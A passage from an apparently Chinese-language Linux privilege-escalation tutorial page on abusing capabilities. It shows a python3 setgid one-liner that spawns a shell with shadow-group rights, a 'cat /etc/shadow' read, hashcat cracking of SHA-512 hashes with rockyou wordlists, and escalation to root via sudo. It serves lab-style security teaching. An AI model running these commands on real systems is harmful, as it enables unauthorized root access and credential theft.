aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164307671-1533778953-720a9e9fb27e68dbbcd0c7db3353036b.png" width="1013" height="149" class="img_ev3q"></p>
<p>我们仍然是用户 juggernaut ；但是，我们确实拥有 root 组权限。这意味着我们可以读取任何只有 root 可读的文件，并且在组权限中设置了 r 位 。</p>
<p>此外，上面的代码片段显示我们无法使用 root 组权限访问 root 文件夹。这是因为 root 文件夹根本没有设置任何组权限。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164307349-467993137-ebbc61156da281247ed897cebc158c7b.png" width="777" height="488" class="img_ev3q"></p>
<p>这意味着我们只能读取 root 文件夹之外的 root 组所拥有的文件。不幸的是，最适合读取的文件确实存在于 root 文件夹中，例如 .bash_history 或 id_rsa 文件。因此，如果我们碰巧在 /root 之外找到一个设置了 root 组权限但没有全局权限的文件，那么就可以从此 shell 读取该文件。</p>
<p>更好的选择是授予我们影子组权限，以便我们可以读取 /etc/shadow 文件。为此，我们可以将 setgid 设置为 42，而不是 0。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/home/juggernaut/bin/python3 -c &#x27;import os; os.setgid(42); os.system(&quot;/bin/bash&quot;)&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164306093-740425035-9bd54bd50c717bc31ffddda9dfde2b1d.png" width="1011" height="112" class="img_ev3q"></p>
<p>这里我们可以看到，我们已经进入了具有 shadow 组权限的 shell。这样，我们就可以读取 shadow 文件了！</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /etc/shadow</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164307223-678428228-9b2efb7144d8cf9f75800c2d3aa8d6ae.png" width="1014" height="738" class="img_ev3q"></p>
<p>太棒了！这使我们能够访问影子文件，我们在其中找到了两个可以尝试破解的哈希值。</p>
<p>使用攻击者机器上的文本编辑器，我们可以复制这两个哈希值，然后开始破解密码。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164305796-237499022-f6d138beca182d73065099b67d6ed5a1.png" width="1005" height="129" class="img_ev3q"></p>
<p>完成后，我们可以使用 <strong>hashcat</strong> 或 <strong>John the Ripper</strong> 尝试破解这些文件。在本例中，我们将使用 hashcat。</p>
<p>我们可以使用以下命令来快速确定此哈希类型所需的破解模式：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat -h | grep &#x27;$6&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164305070-1404018059-fa225e6bb93be4994ad9d7f7ef66163d.png" width="659" height="80" class="img_ev3q"></p>
<p>这告诉我们破解模式是 1800。我们还知道哈希是 SHA-512，因为我们之前生成了自己的哈希来编辑影子文件，所以这看起来不错。</p>
<p>接下来，我们将首先通过测试 rockyou 单词表来开始破解哈希值，如果没有得到任何结果，我们可以对其进行扩展。</p>
<blockquote>
<p>要扩展 Rockyou 的功能，可以尝试使用 best64 等规则，甚至寻找不同的单词表。说到哈希破解，Rockyou 并不是万能的。</p>
</blockquote>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat -m 1800 ./hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>随着破解的开始，我们很快就会发现这种哈希类型的破解速度并不是最快的。例如，这两个哈希大约需要 2.5 小时才能破解整个单词表。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304865-367005464-f0343218fc49c7efe6200f6037af6494.png" width="522" height="163" class="img_ev3q"></p>
<p>由于这需要很长时间，所以更好的办法是在使用完整名单之前，先从 <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer">SecLists</a> 中测试一些缩短的 Rockyou 名单。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat -m 1800 ./hashes.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -o cracked.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>由于这是一个缩短的列表，我们仅用 48 秒就完成了整个过程，并且成功恢复了 1/2 个密码！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164307472-1632192361-15058afad0c95c6c4fb944d33b8d8b53.png" width="717" height="304" class="img_ev3q"></p>
<p>检查我们将输出重定向到的 “cracked.txt” 文件，我们可以看到我们已经破解了 juggernaut 用户的密码。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164306648-1506978714-7a545c929c145abda1b83769102429a3.png" width="878" height="65" class="img_ev3q"></p>
<p>这告诉我们用户的密码是 <strong>P@ssw0rd</strong> ，并且从前面我们看到，该用户属于 sudo 组，只要我们知道用户的密码，就可以以 root 身份运行任何命令。你猜怎么着？——我们现在知道密码了，所以我们可以轻松提升到 root 权限！</p>
<p>当我们运行 <strong>sudo -l</strong> 命令时，系统会提示输入密码，成功输入密码后，我们看到当以该用户身份使用 sudo 时，我们拥有作为 root 的完全权限。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304700-1640769867-d6bab5f27224de2a37bc74e39a509d77.png" width="557" height="76" class="img_ev3q"></p>
<p>看到 (ALL) ALL 意味着我们可以简单地 <strong>sudo su –</strong> 并成为 root 。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304858-1653406197-ae70791ba0211b13034d631faa80944b.png" width="348" height="96" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="4最后的想法"><strong><div id="id4">4、最后的想法</div></strong><a href="#4最后的想法" class="hash-link" aria-label="4最后的想法的直接链接" title="4最后的想法的直接链接">​</a></h2>
<p>我们列举了六种不同功能的各种示例，但这只是皮毛，因为还有很多很多。我想通过这篇文章达到的目的不仅是向你展示如何利用这些特定功能，而且还要向你展示如何像黑客一样思考，以及你应该瞄准 Linux 系统中的哪些文件。</p>
<p>我希望重点介绍如何编辑 /etc/passwd 或 /etc/shadow 文件、如何使用 id_rsa 文件通过 SSH 登录、如何破解影子文件中的密码哈希值、SUID 位添加到 bash（或基本上任何二进制文件）后可以做什么 等等。</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/web/docs/category/linux-提权"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Linux 提权</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/web/docs/渗透/Linux 提权/Linux 提权-Cron Jobs"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Linux 提权-Cron Jobs</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#导航" class="table-of-contents__link toc-highlight">导航</a></li><li><a href="#0前言" class="table-of-contents__link toc-highlight"><strong><div>0、前言</div></strong></a></li><li><a href="#1什么是-capabilities-" class="table-of-contents__link toc-highlight"><strong><div>1、什么是 Capabilities ？</div></strong></a></li><li><a href="#2枚举-capabilities" class="table-of-contents__link toc-highlight"><strong><div>2、枚举 Capabilities</div></strong></a></li><li><a href="#3利用各种-capabilities" class="table-of-contents__link toc-highlight"><strong><div>3、利用各种 Capabilities</div></strong></a></li><li><a href="#4最后的想法" class="table-of-contents__link toc-highlight"><strong><div>4、最后的想法</div></strong></a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a href="https://www.cnblogs.com/kqdssheng" rel="noopener noreferrer" class="footerLogoLink_BH7S"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--light_NVdE" width="30" height="30"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--dark_xIcU" width="30" height="30"></a></div></div></div></footer></div>
</body>
</html>